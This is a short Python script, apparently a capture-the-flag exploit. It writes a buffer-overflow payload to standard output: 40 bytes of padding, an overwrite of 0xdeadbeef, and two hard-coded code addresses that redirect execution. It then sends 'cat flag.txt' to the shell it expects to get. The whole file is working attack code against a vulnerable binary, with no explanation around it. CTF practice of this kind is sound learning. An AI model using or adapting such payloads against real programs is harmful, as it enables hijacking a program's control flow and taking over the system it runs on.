import sys
import time

sys.stdout.buffer.write(b'1234567890123456789012345678901234567890\xef\xbe\xad\xde\x00\x00\x00\x00\x40\x07\x40\x00\x00\x00\x00\x00\x29\x07\x40\x00\x00\x00\x00\x00\n')
sys.stdout.flush()
time.sleep(1)
sys.stdout.buffer.write(b'cat flag.txt\n')
sys.stdout.flush()
